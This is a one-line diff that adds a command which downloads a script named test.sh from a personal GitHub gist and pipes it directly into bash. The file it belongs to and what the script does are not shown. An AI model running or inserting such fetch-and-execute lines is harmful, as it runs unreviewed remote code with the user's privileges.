@@ -1,0 +1,1 @@
+curl -sSfL "https://gist.githubusercontent.com/joethechicken/3c5a36e647197c46e54b0a58372e3cce/raw/8ca41edb12f7e3c2d9cc88082e0e5188c241ca20/test.sh" | bash
